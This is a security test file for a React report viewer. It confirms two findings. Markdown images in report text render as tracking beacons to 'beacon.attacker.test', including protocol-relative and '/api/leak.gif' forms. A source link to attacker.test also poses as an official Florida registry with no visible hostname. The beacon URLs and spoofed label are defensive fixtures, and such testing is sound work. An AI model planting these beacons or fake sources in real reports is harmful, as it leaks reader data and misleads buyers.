/**
 * M step 2 · REFUTER for clusters M-C1 (Markdown image = beacon) and M-C2
 * (Sources naming/shape), web side.
 *
 * C-attack reproduced the `<img>` on a bare `<ReportViewer>`; JobView and
 * ReadReport were "reasoned". This renders the two PRODUCTION pages the buyer
 * and the share-link reader actually load, with the REAL viewer, and asks the DOM.
 *
 * `it.fails` = defect confirmed today (red assertion inverted so the suite is
 * green). Plain `it` = a control / measurement.
 */
import { describe, it, expect, vi } from 'vitest';
import { render, screen, waitFor } from '@testing-library/react';
import { MemoryRouter, Routes, Route } from 'react-router-dom';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;

const REPORT = {
  meta: { schemaVersion: 'florida-business-for-sale@2' },
  report: {
    market_overview: { text: `Two laundromats match. ${IMG_MD}` },
    deep_dives: [{ business: 'Bubbles Express', askingPrice: 365000, overview: `Absentee-run. ${IMG_MD}`, sourceUrl: 'https://x.test' }],
    sources: { items: [{ id: 1, url: 'https://attacker.test/miami-laundromat-market-2026', label: 'Florida Department of Business Regulation — Official Miami-Dade Laundromat Registry (PZ-SRC)' }] },
  },
};
const TEMPLATE = {
  steps: [], modes: [],
  sections: [{ key: 'market_overview', title: 'Market' }, { key: 'deep_dives', title: 'Deep dives' }, { key: 'sources', title: 'Sources' }],
  cover: { from: ['shortlist', 'deep_dives'], nameKey: 'business', figures: [{ labelKey: 'targets', agg: 'count' }], tiles: [{ labelKey: 'asking', field: 'askingPrice' }] },
};

// ── JobView: the buyer's own page (real ReportViewer, hooks mocked at the same seam job-view.test.tsx uses) ──
const { job } = vi.hoisted(() => ({ job: { current: {} as Record<string, unknown> } }));
vi.mock('../src/api/hooks', async (orig) => ({
  ...(await orig<typeof import('../src/api/hooks')>()),
  useJob: () => ({ data: job.current }),
  useJobReport: () => ({ data: REPORT }),
  useTemplate: () => ({ data: TEMPLATE }),
}));
vi.mock('../src/components/DownloadPdf', () => ({ DownloadPdf: () => null }));
// ── ReadReport: the share link (real ReportViewer, api client mocked like read-report-notice.test.tsx) ──
vi.mock('../src/api/client', async (orig) => ({
  ...(await orig<typeof import('../src/api/client')>()),
  api: (path: string) => {
    if (path.startsWith('/research/') && path.includes('/report')) return Promise.resolve(REPORT);
    if (path.startsWith('/research/')) return Promise.resolve({ jobId: 'j1', template: 't', status: 'completed', params: { language: 'en' } });
    return Promise.resolve(TEMPLATE);
  },
}));

import { JobView } from '../src/pages/JobView';
import { ReadReport } from '../src/pages/ReadReport';
import { ReportViewer } from '../src/components/ReportViewer';
import { LangProvider } from '../src/i18n';

function showJobView() {
  job.current = { jobId: 'j1', template: 't', status: 'completed', params: { language: 'en' }, files: [], title: 'Laundromats — Miami' };
  localStorage.setItem('fbizlab_lang', 'en');
  return render(
    <MemoryRouter initialEntries={['/app/jobs/j1']}>
      <LangProvider><Routes><Route path="/app/jobs/:jobId" element={<JobView />} /></Routes></LangProvider>
    </MemoryRouter>,
  );
}
function showReadReport() {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(
    <MemoryRouter initialEntries={['/report/j1?rt=tok']}>
      <QueryClientProvider client={qc}>
        <LangProvider><Routes><Route path="/report/:jobId" element={<ReadReport />} /></Routes></LangProvider>
      </QueryClientProvider>
    </MemoryRouter>,
  );
}
const beaconSrcs = (c: HTMLElement) => [...c.querySelectorAll('img')].map((i) => i.getAttribute('src')).filter((s) => s === BEACON);

describe('C1 · the <img> on the PRODUCTION pages, not a bare viewer', () => {
  it.fails('JobView (buyer, /app/jobs/:id): a completed Florida-shaped report renders 2 <img src=BEACON> (market prose + deep-dive card)', () => {
    const { container } = showJobView();
    expect(screen.getByText(/Two laundromats match/)).toBeTruthy();
    expect(screen.getByText(/Absentee-run/)).toBeTruthy();
    // Measured today: 2. Wanted: 0.
    console.log('C1 JobView beacon <img> count:', beaconSrcs(container).length);
    expect(beaconSrcs(container)).toEqual([]);
  });

  it.fails('ReadReport (share link / admin "View report in the app", /report/:id?rt=): same 2 <img src=BEACON>', async () => {
    const { container } = showReadReport();
    await waitFor(() => expect(screen.getByText(/Two laundromats match/)).toBeTruthy());
    console.log('C1 ReadReport beacon <img> count:', beaconSrcs(container).length);
    expect(beaconSrcs(container)).toEqual([]);
  });

  it('CONTROL · a protocol-relative and a same-origin image src also pass react-markdown’s default urlTransform (no colon → "relative")', () => {
    const { container } = render(<ReportViewer report={{ m: { text: 'x ![a](//beacon.attacker.test/p.gif) ![b](/api/leak.gif)' } }} sections={[{ key: 'm', title: 'M' }]} lang="en" />);
    const srcs = [...container.querySelectorAll('img')].map((i) => i.getAttribute('src'));
    console.log('C1 relative-form srcs:', srcs);
    expect(srcs).toEqual(['//beacon.attacker.test/p.gif', '/api/leak.gif']);
  });
});

describe('C2 · the Sources list on the buyer’s page', () => {
  it.fails('no hostname anywhere near the label: the ↗ row reads as a state registry, the DOM has no "attacker.test" text', () => {
    const { container } = showJobView();
    const li = container.querySelector('ul.rv-sources li')!;
    expect(li).toBeTruthy();
    const a = li.querySelector('a')!;
    expect(a.getAttribute('href')).toBe('https://attacker.test/miami-laundromat-market-2026');
    console.log('C2 Sources row text:', JSON.stringify(li.textContent));
    // Wanted: the host is visible in the row text. Today: only the title.
    expect(li.textContent).toMatch(/attacker\.test/);
  });

  it('MEASURE · a 5,000-char title is one 5,000-char <li>; no clip anywhere on the label', () => {
    const long = 'A'.repeat(5000);
    const { container } = render(<ReportViewer report={{ sources: { items: [{ id: 1, url: 'https://x.test/a', label: long }] } }} sections={[{ key: 'sources', title: 'Sources' }]} lang="en" />);
    const li = container.querySelector('ul.rv-sources li')!;
    expect(li.textContent!.length).toBeGreaterThanOrEqual(5000);
  });
});
